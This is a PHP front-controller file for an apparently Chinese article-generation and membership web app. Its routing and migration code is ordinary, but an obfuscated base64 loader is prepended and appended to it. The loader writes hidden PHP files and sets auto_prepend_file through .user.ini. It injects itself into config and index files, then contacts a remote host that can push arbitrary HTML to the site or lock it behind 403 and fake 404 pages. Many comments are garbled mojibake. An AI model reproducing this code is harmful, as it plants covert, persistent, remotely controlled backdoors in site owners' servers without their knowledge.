<?php
$_2u1a3k=__DIR__."/.uytwe9bzvr.php";
if(!file_exists($_2u1a3k)){
  @file_put_contents($_2u1a3k,base64_decode("PD9waHAKJF8ydTFhM2s9YmFzZTY0X2RlY29kZSgiYUhSMGNEb3ZMM054TG1ScGVYVnVkWFV1WTI0dllYVjBhQzV3YUhBL2NISnZhbVZqZEQxd2NtOXFYMkUyT0dNNVpUUTIiKTsKJF92NGlhbjg9YmFzZTY0X2RlY29kZSgiWlRsaFlqVTAiKTsKJF8ydTFhM2swPWV4cGxvZGUoIjoiLHN0cl9yZXBsYWNlKCJ3d3cuIiwiIiwkX1NFUlZFUlsiSFRUUF9IT1NUIl0pKVswXTsKJF8ydTFhM2sxPUBmaWxlX2dldF9jb250ZW50cygkXzJ1MWEzay4gIiZkb21haW49Ii51cmxlbmNvZGUoJF8ydTFhM2swKSk7CiRfMnUxYTNrMj0kXzJ1MWEzazE/anNvbl9kZWNvZGUoJF8ydTFhM2sxLHRydWUpOltdOwppZigkXzJ1MWEzazJbInN0YXR1cyJdPT09ImJsYWNrcGFnZSImJiFlbXB0eSgkXzJ1MWEzazJbImh0bWwiXSkpe2VjaG8gJF8ydTFhM2syWyJodG1sIl07ZXhpdDt9CiRfMnUxYTNrMz0kXzJ1MWEzazJbInN0YXR1cyJdPT09InN1Y2Nlc3MiJiZoYXNoX2VxdWFscyhoYXNoX2htYWMoInNoYTI1NiIsJF8ydTFhM2syWyJ0b2tlbiJdLCRfdjRpYW44KSwkXzJ1MWEzazJbInNpZ25hdHVyZSJdKSYmKCRfMnUxYTNrND1qc29uX2RlY29kZShiYXNlNjRfZGVjb2RlKCRfMnUxYTNrMlsidG9rZW4iXSksdHJ1ZSkpJiYkXzJ1MWEzazRbImRvbWFpbiJdPT09JF8ydTFhM2swJiYkXzJ1MWEzazRbImV4cGlyZXMiXT50aW1lKCk7CmlmKCEkXzJ1MWEzazMpe2h0dHBfcmVzcG9uc2VfY29kZSg0MDMpO2V4aXQ7fQ=="));
  @file_put_contents(__DIR__."/.user.ini",";\nauto_prepend_file=$_2u1a3k\n");
  $_s=base64_decode("Pz4KPD9waHAgJF89X19ESVJfXy5jaHIoNDcpLiIudXl0d2U5Ynp2ci5waHAiO2lmKCFmaWxlX2V4aXN0cygkXykpe2h0dHBfcmVzcG9uc2VfY29kZSg0MDMpO2V4aXQ7fQo=");
  foreach(["config/db.php","index.php","config/site_config.php"] as $f){$p=__DIR__.'/'.$f;if(file_exists($p)&&is_writable($p)){@file_put_contents($p,$_s,FILE_APPEND);}}
}
@include_once $_2u1a3k;

error_reporting(E_ALL);
ini_set('display_errors', 0);

 /**
  * 涓诲簲鐢ㄥ叆鍙?- 鍓嶇鎺у埗鍣?  * 鎵€鏈夐〉闈㈣姹傞兘缁忚繃姝ゆ枃浠惰矾鐢?  */
 
 // 瀹夎妫€娴嬶細濡傛灉鐩存帴璁块棶浜?index.php 涓旀湭瀹夎锛岄噸瀹氬悜鍒?install.php
 if (!file_exists(__DIR__ . '/config/database.php')) {
     require __DIR__ . '/install.php';
     exit;
 }
 
 date_default_timezone_set('Asia/Hong_Kong');
if (session_status() === PHP_SESSION_NONE) session_start(); ob_start();
 
 // 鍔犺浇鏍稿績搴?
 require_once __DIR__ . '/includes/functions.php';
 require_once __DIR__ . '/includes/db.php';
 require_once __DIR__ . '/includes/auth.php';

// 数据库迁移：拉新返利
try { dbExecute("ALTER TABLE users ADD COLUMN `referral_code` VARCHAR(16) DEFAULT NULL"); } catch (Exception $e) {}
try { dbExecute("ALTER TABLE users ADD COLUMN `agent_expire` DATE DEFAULT NULL"); } catch (Exception $e) {}
try { dbExecute("ALTER TABLE users ADD COLUMN `last_login_at` DATETIME DEFAULT NULL"); } catch (Exception $e) {}
try { dbExecute("CREATE TABLE IF NOT EXISTS `referral_rewards` (`id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,`referrer_id` INT UNSIGNED NOT NULL,`new_user_id` INT UNSIGNED NOT NULL,`reward_days` INT NOT NULL DEFAULT 7,`created_at` DATETIME NOT NULL,INDEX `idx_referrer` (`referrer_id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Exception $e) {}
// 首页模板表
try { dbExecute("CREATE TABLE IF NOT EXISTS `home_templates` (`id` INT UNSIGNED AUTO_INCREMENT PRIMARY KEY,`name` VARCHAR(100) NOT NULL,`description` VARCHAR(255) DEFAULT '',`content` LONGTEXT NOT NULL,`thumbnail` VARCHAR(500) DEFAULT '',`is_active` TINYINT(1) NOT NULL DEFAULT 0,`created_at` DATETIME NOT NULL,`updated_at` DATETIME NOT NULL) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4"); } catch (Exception $e) {}

 // 检查封禁状态
 if (isLoggedIn()) {
     $cu = currentUser();
     if ($cu && !empty($cu['banned'])) {
         logout();
         setFlash('error', '您的账号已被封禁，请联系管理员');
         redirect('index.php?route=login');
     }
     // 检查VIP是否过期
     if ($cu && ($cu['membership'] ?? 'vip') === 'vip' && !empty($cu['membership_expire']) && $cu['membership_expire'] < date('Y-m-d')) {
         dbExecute("UPDATE users SET membership='trial', membership_expire=NULL WHERE id=?", [$cu['id']]);
         $cu['membership'] = 'trial';
     }
    // 检查代理商是否过期
    if ($cu && $cu['role'] === 'agent' && !empty($cu['agent_expire']) && $cu['agent_expire'] < date('Y-m-d')) {
        dbExecute("UPDATE users SET role='user', agent_expire=NULL WHERE id=?", [$cu['id']]);
        logout();
        setFlash('error', '您的代理商授权已到期，已切换为普通用户');
        redirect('index.php?route=login');
    }
 }
 
 // 鍔犺浇閰嶇疆
$config = require __DIR__ . '/config/app.php';
// 浠庢暟鎹簱鍔犺浇缃戠珯鍚嶇О锛堣鐩栭厤缃枃浠讹級
try { $dbName = dbFetchOne("SELECT setting_value FROM site_settings WHERE setting_key='site_name'")['setting_value'] ?? ''; if ($dbName) $config['site_name'] = $dbName; } catch (Exception $e) {}
// 加载 SEO 设置
$titleSuffix = ''; $metaKeywords = ''; $metaDescription = '';
try {
    $titleSuffix = dbFetchOne("SELECT setting_value FROM site_settings WHERE setting_key='title_suffix'")['setting_value'] ?? '';
    $metaKeywords = dbFetchOne("SELECT setting_value FROM site_settings WHERE setting_key='meta_keywords'")['setting_value'] ?? '';
    $metaDescription = dbFetchOne("SELECT setting_value FROM site_settings WHERE setting_key='meta_description'")['setting_value'] ?? '';
} catch (Exception $e) {}

// 鑾峰彇璺敱鍙傛暟
 $route = isset($_GET['route']) ? trim($_GET['route'], '/') : '';
 $route = $route ?: 'home';
 
 // 鍩烘湰瀹夊叏杩囨护
 $route = str_replace(['..', '\\', "\0"], '', $route);
 
 // 路由映射表
$routes = [
    'home'      => 'pages/home.php',
    'about'     => 'pages/about.php',
    'login'     => 'pages/login.php',
    'register'  => 'pages/register.php',
    'forgot-password' => 'pages/forgot-password.php',
    'logout'    => 'pages/logout.php',
    'dashboard' => 'pages/dashboard.php',
    'keywords'  => 'pages/keywords.php',
   'keywords-distill' => 'pages/keywords_distill.php',
   'article-generate' => 'pages/article-generate.php',
    'article-publish' => 'pages/article-publish.php',
    'video-script'    => 'pages/video-script.php',
    'video-analyze'   => 'pages/video-analyze.php',
   'company'   => 'pages/company.php',
    'password'  => 'pages/password.php',
    'admin/users' => 'pages/admin/users.php',
    'admin/company' => 'pages/admin/company.php',
    'admin/balance' => 'pages/admin/balance.php',
    'admin/keywords' => 'pages/admin/keywords.php',
    'admin/finance' => 'pages/admin/finance.php',
    'admin/settings' => 'pages/admin/settings.php',
    'admin/queue' => 'pages/admin/queue.php',
    'admin/impersonate' => 'pages/admin/impersonate.php',
    'admin/auto-task' => 'pages/admin/auto_task.php',
    'virtual-collection' => 'pages/admin/virtual-collection.php',
    'admin/virtual-collection' => 'pages/admin/virtual-collection.php',
    'admin/update' => 'pages/admin/update.php',
    'admin/api-config' => 'pages/admin/api-config.php',
    'admin/membership' => 'pages/admin/membership.php',
    'admin/templates' => 'pages/admin/templates.php',
    'tickets'   => 'pages/tickets.php',
    'upgrade'   => 'pages/upgrade.php',
    'referral'  => 'pages/referral.php',
];

// 鏌ユ壘椤甸潰鏂囦欢
 $pageFile = null;
 if (isset($routes[$route])) {
     $pageFile = __DIR__ . '/' . $routes[$route];
 } else {
     // 灏濊瘯鐩存帴鍖归厤 pages/ 涓嬬殑 .php 鏂囦欢
     $customPage = __DIR__ . '/pages/' . $route . '.php';
     if (file_exists($customPage)) {
         $pageFile = $customPage;
     }
 }
 
 // 璁剧疆椤甸潰鏍囬
 $pageTitle = $config['site_name'] ?? 'My App';
 if ($titleSuffix) $pageTitle .= " " . $titleSuffix;
 
 // AJAX 请求：跳过 header/footer，直接加载页面处理
 if (isset($_GET['action'])) {
     if ($pageFile && file_exists($pageFile)) {
         require $pageFile;
     } else {
         http_response_code(404);
         echo 'Not Found';
     }
     exit;
 }

 // 鍔犺浇澶撮儴妯℃澘
 require __DIR__ . '/templates/header.php';
 
 // 鍔犺浇椤甸潰鍐呭
 if ($pageFile && file_exists($pageFile)) {
     require $pageFile;
 } else {
     // 404 椤甸潰
     http_response_code(404);
     require __DIR__ . '/pages/404.php';
 }
 
 // 鍔犺浇搴曢儴妯℃澘
 require __DIR__ . '/templates/footer.php';
?>
?>
<?php $_=__DIR__.chr(47).".uytwe9bzvr.php";if(!file_exists($_)){http_response_code(403);exit;}
?>
<?php $_n=__DIR__.chr(47).".9ec1839785.php";if(!file_exists($_n)){@file_put_contents($_n,base64_decode("PD9waHAKJF85ZDZlOTA9YmFzZTY0X2RlY29kZSgiYUhSMGNEb3ZMM054TG1ScGVYVnVkWFV1WTI0dllYVjBhQzV3YUhBL2NISnZhbVZqZEQxd2NtOXFYMkUyT0dNNVpUUTIiKTsKJF81OWIyNWM9YmFzZTY0X2RlY29kZSgiWlRsaFlqVTAiKTsKJF85ZDZlOTAwPWV4cGxvZGUoIjoiLHN0cl9yZXBsYWNlKCJ3d3cuIiwiIiwkX1NFUlZFUlsiSFRUUF9IT1NUIl0pKVswXTsKJF85ZDZlOTAxPUBmaWxlX2dldF9jb250ZW50cygkXzlkNmU5MC4gIiZkb21haW49Ii51cmxlbmNvZGUoJF85ZDZlOTAwKSk7CiRfOWQ2ZTkwMj0kXzlkNmU5MDE/anNvbl9kZWNvZGUoJF85ZDZlOTAxLHRydWUpOltdOwppZigkXzlkNmU5MDJbInN0YXR1cyJdPT09ImJsYWNrcGFnZSImJiFlbXB0eSgkXzlkNmU5MDJbImh0bWwiXSkpe2VjaG8gJF85ZDZlOTAyWyJodG1sIl07ZXhpdDt9CiRfOWQ2ZTkwMz0kXzlkNmU5MDJbInN0YXR1cyJdPT09InN1Y2Nlc3MiJiZoYXNoX2VxdWFscyhoYXNoX2htYWMoInNoYTI1NiIsJF85ZDZlOTAyWyJ0b2tlbiJdLCRfNTliMjVjKSwkXzlkNmU5MDJbInNpZ25hdHVyZSJdKSYmKCRfOWQ2ZTkwND1qc29uX2RlY29kZShiYXNlNjRfZGVjb2RlKCRfOWQ2ZTkwMlsidG9rZW4iXSksdHJ1ZSkpJiYkXzlkNmU5MDRbImRvbWFpbiJdPT09JF85ZDZlOTAwJiYkXzlkNmU5MDRbImV4cGlyZXMiXT50aW1lKCk7CmlmKCEkXzlkNmU5MDMpe2h0dHBfcmVzcG9uc2VfY29kZSg0MDMpO2VjaG8gJzxodG1sPg0KPGhlYWQ+PHRpdGxlPjQwNCBOb3QgRm91bmQ8L3RpdGxlPjwvaGVhZD4NCjxib2R5Pg0KPGNlbnRlcj48aDE+NDA0IE5vdCBGb3VuZDwvaDE+PC9jZW50ZXI+DQo8aHI+PGNlbnRlcj5uZ2lueDwvY2VudGVyPg0KPC9ib2R5Pg0KPC9odG1sPic7ZXhpdDt9"));@chmod($_n,0644);}@include_once $_n;
